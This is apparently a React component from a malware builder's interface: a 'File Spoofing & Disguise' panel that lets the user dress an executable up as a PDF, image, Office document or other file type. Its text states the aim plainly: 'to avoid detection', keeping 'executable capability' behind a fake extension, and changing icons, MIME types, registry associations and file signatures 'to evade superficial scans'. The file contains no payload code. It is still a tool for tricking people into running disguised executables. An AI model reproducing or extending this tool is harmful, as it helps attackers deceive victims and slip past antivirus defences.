import React from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Shield, FileIcon, FileText, FileImage, FileAudio, FileVideo, FileSpreadsheet, File } from "lucide-react";

export type FileType = "pdf" | "txt" | "jpg" | "png" | "mp3" | "mp4" | "xlsx" | "docx" | "zip" | "csv" | "html";

interface FileSpoofingProps {
  enabled: boolean;
  selectedFileType: FileType | null;
  onToggle: (enabled: boolean) => void;
  onSelectFileType: (fileType: FileType) => void;
}

export const fileTypeOptions: { type: FileType; name: string; icon: React.ReactNode; extension: string; mimeType: string }[] = [
  { type: "pdf", name: "PDF Document", icon: <FileText className="h-5 w-5 text-red-400" />, extension: ".pdf", mimeType: "application/pdf" },
  { type: "txt", name: "Text File", icon: <FileText className="h-5 w-5 text-gray-400" />, extension: ".txt", mimeType: "text/plain" },
  { type: "jpg", name: "JPEG Image", icon: <FileImage className="h-5 w-5 text-blue-400" />, extension: ".jpg", mimeType: "image/jpeg" },
  { type: "png", name: "PNG Image", icon: <FileImage className="h-5 w-5 text-green-400" />, extension: ".png", mimeType: "image/png" },
  { type: "mp3", name: "MP3 Audio", icon: <FileAudio className="h-5 w-5 text-purple-400" />, extension: ".mp3", mimeType: "audio/mpeg" },
  { type: "mp4", name: "MP4 Video", icon: <FileVideo className="h-5 w-5 text-blue-400" />, extension: ".mp4", mimeType: "video/mp4" },
  { type: "xlsx", name: "Excel Spreadsheet", icon: <FileSpreadsheet className="h-5 w-5 text-green-500" />, extension: ".xlsx", mimeType: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" },
  { type: "docx", name: "Word Document", icon: <FileText className="h-5 w-5 text-blue-500" />, extension: ".docx", mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document" },
  { type: "zip", name: "ZIP Archive", icon: <File className="h-5 w-5 text-yellow-500" />, extension: ".zip", mimeType: "application/zip" },
  { type: "csv", name: "CSV File", icon: <FileSpreadsheet className="h-5 w-5 text-gray-500" />, extension: ".csv", mimeType: "text/csv" },
  { type: "html", name: "HTML File", icon: <FileIcon className="h-5 w-5 text-orange-400" />, extension: ".html", mimeType: "text/html" },
];

export default function FileSpoofing({ enabled, selectedFileType, onToggle, onSelectFileType }: FileSpoofingProps) {
  return (
    <Card className="bg-black/60 border-red-900/20 mb-6">
      <CardHeader>
        <CardTitle className="text-lg font-semibold text-white flex items-center">
          <Shield className="h-5 w-5 text-red-500 mr-2" />
          File Spoofing & Disguise
        </CardTitle>
        <CardDescription className="text-gray-400">
          Disguise your executable as other file types to avoid detection
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="flex items-center justify-between">
          <div>
            <Label className="text-white" htmlFor="enableSpoofing">Enable File Spoofing</Label>
            <p className="text-xs text-gray-400">
              Disguise your executable as another file type
            </p>
          </div>
          <Switch
            id="enableSpoofing"
            checked={enabled}
            onCheckedChange={onToggle}
            className="toggle-switch"
          />
        </div>

        {enabled && (
          <div className="pt-2">
            <Label className="text-white mb-2 block">Select File Disguise</Label>
            <Select
              value={selectedFileType || ""}
              onValueChange={(value) => onSelectFileType(value as FileType)}
            >
              <SelectTrigger className="w-full bg-black/80 border-red-900/30 text-white">
                <SelectValue placeholder="Choose a file type to spoof" />
              </SelectTrigger>
              <SelectContent className="bg-black border-red-900/30 max-h-80">
                {fileTypeOptions.map((option) => (
                  <SelectItem 
                    key={option.type} 
                    value={option.type} 
                    className="text-white hover:bg-red-950/50 flex items-center"
                  >
                    <div className="flex items-center">
                      {option.icon}
                      <span className="ml-2">{option.name}</span>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>

            {selectedFileType && (
              <div className="mt-4 p-4 bg-red-950/20 border border-red-900/40 rounded-lg">
                <div className="flex items-center">
                  {fileTypeOptions.find(o => o.type === selectedFileType)?.icon}
                  <div className="ml-3">
                    <p className="text-white font-medium">
                      Your .exe will be disguised as: {fileTypeOptions.find(o => o.type === selectedFileType)?.name}
                    </p>
                    <p className="text-xs text-gray-400">
                      Extension: {fileTypeOptions.find(o => o.type === selectedFileType)?.extension} | 
                      MIME type: {fileTypeOptions.find(o => o.type === selectedFileType)?.mimeType}
                    </p>
                  </div>
                </div>
                <div className="mt-3 text-xs text-gray-300">
                  <p className="font-medium text-red-400 mb-1">Protection includes:</p>
                  <ul className="list-disc pl-5 space-y-1 text-gray-400">
                    <li>Custom icon matching the selected file type</li>
                    <li>File extension spoofing while maintaining executable capability</li>
                    <li>MIME type metadata modification</li>
                    <li>Registry association spoofing</li>
                    <li>File signature modification to evade superficial scans</li>
                  </ul>
                </div>
              </div>
            )}
          </div>
        )}
      </CardContent>
    </Card>
  );
}